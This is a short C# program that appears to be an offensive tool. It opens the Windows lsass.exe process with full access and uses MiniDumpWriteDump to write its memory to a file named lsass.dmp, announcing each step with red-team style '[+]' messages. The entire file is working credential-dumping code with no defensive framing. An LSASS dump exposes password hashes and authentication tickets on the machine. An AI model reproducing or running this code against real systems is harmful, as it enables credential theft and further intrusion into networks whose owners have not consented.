using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.IO;


namespace Minidump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        static void Main(string[] args)
        {
            Console.WriteLine("[+]File Path Created \r\n");
            FileStream dumpFile = new FileStream("C:\\Enter\\File\\Path\\Here\\lsass.dmp", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            Console.WriteLine("[+]Lsass.exe process ID found \r\n");
            int lsass_pid = lsass[0].Id;
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            Console.WriteLine("[+]Process Handle to lsass.exe created \r\n");
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero,IntPtr.Zero);
            Console.WriteLine("[+]Lsass.exe process successfully dumped \r\n");
        }
    }
}
